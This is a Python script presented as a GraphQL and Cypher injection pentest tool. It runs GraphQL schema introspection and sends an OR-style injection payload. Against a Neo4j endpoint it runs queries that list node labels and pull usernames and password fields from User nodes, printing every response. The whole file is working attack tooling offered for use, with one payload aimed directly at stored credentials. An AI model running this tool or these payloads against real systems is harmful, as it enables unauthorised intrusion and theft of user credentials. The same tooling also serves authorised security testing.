#!/usr/bin/env python3
"""
pentest_tool.py — Simple GraphQL & Cypher injection pentester .. (dev) ..
"""

import argparse
import requests
import time
from typing import List, Dict

class GraphQLPentester:
    def __init__(self, endpoint: str, headers: Dict[str,str] = None, timeout: int = 10):
        self.endpoint = endpoint
        self.headers = headers or {"Content-Type": "application/json"}
        self.timeout = timeout

    def introspect(self) -> Dict:
        payload = {
            "query": "query { __schema { types { name fields { name } } } }"
        }
        r = requests.post(self.endpoint, json=payload, headers=self.headers, timeout=self.timeout)
        return r.json()

    def inject(self, payloads: List[str]) -> None:
        for p in payloads:
            body = {"query": p}
            start = time.time()
            r = requests.post(self.endpoint, json=body, headers=self.headers, timeout=self.timeout)
            elapsed = time.time() - start
            print(f"[GraphQL] Payload: {p!r}")
            print(f"  → Status: {r.status_code}, Time: {elapsed:.2f}s")
            if r.text:
                print(f"  → Response snippet: {r.text[:200]!r}")
            print()

class CypherPentester:
    def __init__(self, endpoint: str, auth: tuple = None, timeout: int = 10):
        self.endpoint = endpoint.rstrip("/") + "/db/neo4j/tx/commit"
        self.auth = auth
        self.timeout = timeout

    def introspect_labels(self) -> None:
        q = {"statements":[{"statement":"MATCH (n) RETURN labels(n), count(*) LIMIT 5"}]}
        r = requests.post(self.endpoint, json=q, auth=self.auth, timeout=self.timeout)
        print("[Cypher] Labels peek:", r.json())

    def inject(self, payloads: List[str]) -> None:
        for p in payloads:
            q = {"statements":[{"statement": p}]}
            start = time.time()
            r = requests.post(self.endpoint, json=q, auth=self.auth, timeout=self.timeout)
            elapsed = time.time() - start
            print(f"[Cypher] Payload: {p!r}")
            print(f"  → Status: {r.status_code}, Time: {elapsed:.2f}s")
            try:
                print(f"  → Data: {r.json()['results']}")
            except Exception:
                print(f"  → Raw: {r.text[:200]!r}")
            print()

def main():
    parser = argparse.ArgumentParser(description="GraphQL & Cypher pentest tool")
    parser.add_argument("--mode", choices=["graphql","cypher"], required=True)
    parser.add_argument("--url", required=True, help="Endpoint URL")
    parser.add_argument("--user", help="Neo4j username (for cypher)")
    parser.add_argument("--pass", dest="password", help="Neo4j password (for cypher)")
    args = parser.parse_args()

    if args.mode == "graphql":
        tool = GraphQLPentester(args.url)
        print("=== Introspection ===")
        schema = tool.introspect()
        print(schema)
        # example payloads — extend as needed
        gql_payloads = [
            '{ user(id:"1\\" OR \\"1\\"=\\"1"){ id name } }',
            'query { __schema { types { name } } }'
        ]
        print("\n=== Testing payloads ===")
        tool.inject(gql_payloads)

    elif args.mode == "cypher":
        auth = (args.user, args.password) if args.user and args.password else None
        tool = CypherPentester(args.url, auth=auth)
        print("=== Label Introspection ===")
        tool.introspect_labels()
        # example payloads — extend as needed
        cypher_payloads = [
            "MATCH (n) RETURN labels(n), count(*) LIMIT 5",
            "MATCH (u:User) RETURN u.username, u.password LIMIT 5"
        ]
        print("\n=== Testing payloads ===")
        tool.inject(cypher_payloads)

if __name__ == "__main__":
    main()
